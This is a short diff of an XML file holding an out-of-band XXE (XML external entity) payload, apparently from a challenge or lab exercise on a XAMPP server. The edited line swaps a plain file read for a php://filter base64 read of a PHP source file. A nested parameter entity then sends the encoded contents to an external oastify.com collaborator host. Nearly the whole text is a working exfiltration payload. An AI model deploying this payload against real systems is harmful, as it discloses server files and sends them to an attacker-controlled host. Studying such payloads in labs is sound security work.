@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY % file SYSTEM "file:///c:/xampp/htdocs/challenge/XXE/stage2.php">
+<!DOCTYPE foo [ <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=c:/xampp/htdocs/challenge/XXE/stage2.php">
 <!ENTITY % mal "<!ENTITY &#x25; xxe SYSTEM 'http://lk982b17bdi3pfgm3k94kur58wen2hq6.oastify.com/?x=%file;'>">
 %mal;
 %xxe;
